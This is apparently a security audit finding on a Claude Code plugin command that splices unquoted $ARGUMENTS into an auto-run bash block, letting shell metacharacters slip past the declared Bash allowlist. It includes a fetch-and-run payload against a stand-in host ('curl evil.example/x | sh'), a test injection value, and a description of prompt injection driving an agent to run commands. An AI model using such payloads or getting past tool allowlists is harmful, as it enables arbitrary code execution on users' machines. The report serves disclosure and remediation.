### Title
Unquoted `$ARGUMENTS` in `ralph-loop.md`'s auto-executed bash block allows shell-metacharacter injection that bypasses the declared `Bash(...)` allowlist - ([File: plugins/ralph-wiggum/commands/ralph-loop.md])

### Finding Description
The command's frontmatter restricts tool usage to a single allow-listed Bash pattern: [1](#0-0) 

Immediately below, the command body embeds a `!`-prefixed bash block that is auto-executed as part of command expansion, substituting the raw `$ARGUMENTS` (the user/attacker-controlled text following `/ralph-loop`) directly into the shell command line, unquoted: [2](#0-1) 

Because `$ARGUMENTS` is interpolated without quoting into a literal shell command string before that string is handed off for execution, any shell metacharacters contained in the argument text (`;`, `&&`, `|`, `` ` ``, `$()`, newlines) are interpreted by the shell as command separators rather than as literal arguments to `setup-ralph-loop.sh`. This defeats the purpose of the `allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]` restriction: the restriction is meant to confine execution to only that one script, but if the permission check only inspects whether the assembled command string begins with the allow-listed script path (a common prefix-matching approach for `Bash(cmd:*)` patterns), an argument like `foo; curl evil.example/x | sh` still "starts with" the allowed script invocation while appending an arbitrary second command that the shell will execute with the same privileges once the whole line reaches a real shell interpreter.

The downstream script itself, `setup-ralph-loop.sh`, does defensive argument parsing for its own flags (`--max-iterations`, `--completion-promise`), but that parsing only matters if the injected payload survives to reach the script's `$@` in the first place - the injection happens one layer earlier, at the point where `$ARGUMENTS` is spliced into the raw shell command string in `ralph-loop.md`.

### Impact Explanation
If reachable (see Likelihood), this results in arbitrary shell command execution on the user's machine, driven entirely by attacker-controlled text that ends up as `$ARGUMENTS` to `/ralph-loop`. This maps to a Claude Code "unauthorized command execution / tool-allowlist bypass" impact: the intended sandboxing declared in `allowed-tools` (limiting execution to one specific script) provides no real containment because the underlying execution path concatenates untrusted text into a shell string rather than passing it as a properly separated/escaped argument vector.

### Likelihood Explanation
Exploitability depends on how `$ARGUMENTS` gets populated in a given invocation flow. If a user types `/ralph-loop <text>` directly, they are simply injecting into their own shell - not a security boundary crossing. However, the greater concern (and why this is flagged) is any flow where `/ralph-loop`'s argument text is derived from untrusted repository content (e.g., an agent auto-invoking this command using text sourced from an issue, PR description, or file content as part of an automated loop) - a well-documented class of prompt-injection-to-command-injection risk for Claude Code plugin commands that interpolate `$ARGUMENTS` into bash blocks unquoted. I was not able to fully verify, within this repo, the exact internal implementation of how Claude Code's command preprocessor performs `$ARGUMENTS` substitution and whether it applies its own escaping before handing the string to the allow-list matcher/Bash tool - that logic lives in the Claude Code core client, not in this plugin repo, so this determination carries some uncertainty.

### Recommendation
- Avoid splicing `$ARGUMENTS` directly into a raw shell command string in the `!`-fenced block. Pass user-supplied text as a properly quoted/escaped argument (e.g., `"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" "$ARGUMENTS"` is still unsafe for multi-arg splitting; instead rely on the underlying tool's argv-array invocation rather than string interpolation, if Claude Code supports it).
- If string interpolation cannot be avoided, sanitize/reject arguments containing shell metacharacters (`;`, `|`, `&`, `` ` ``, `$(`, newlines) before constructing the command line.
- Confirm with Claude Code core team whether `Bash(cmd:*)` allow-list matching is prefix-based on the final assembled string (vulnerable to metacharacter smuggling) or performs proper argv tokenization/validation, and harden the matcher to reject compound shell commands.

### Proof of Concept
Integration test plan:
1. Set up a test harness that simulates command expansion for `plugins/ralph-wiggum/commands/ralph-loop.md`, feeding `ARGUMENTS = "task; touch /tmp/pwned"`.
2. Render the `!`-block template: `"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS`.
3. Execute the resulting string via `bash -c "<rendered string>"` (mirroring how the auto-exec bash block would be run).
4. Assert that `/tmp/pwned` is created, demonstrating that a command beyond `setup-ralph-loop.sh` executed despite the `allowed-tools` restriction limiting execution to that script only.
5. As a control, assert that `setup-ralph-loop.sh` alone (without the injected `;`) behaves as documented, confirming the injection is specifically due to the unquoted interpolation and not a general script bug.

### Citations

**File:** plugins/ralph-wiggum/commands/ralph-loop.md (L4-4)
```markdown
allowed-tools: ["Bash(${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh:*)"]
```

**File:** plugins/ralph-wiggum/commands/ralph-loop.md (L12-14)
```markdown
```!
"${CLAUDE_PLUGIN_ROOT}/scripts/setup-ralph-loop.sh" $ARGUMENTS
```
```
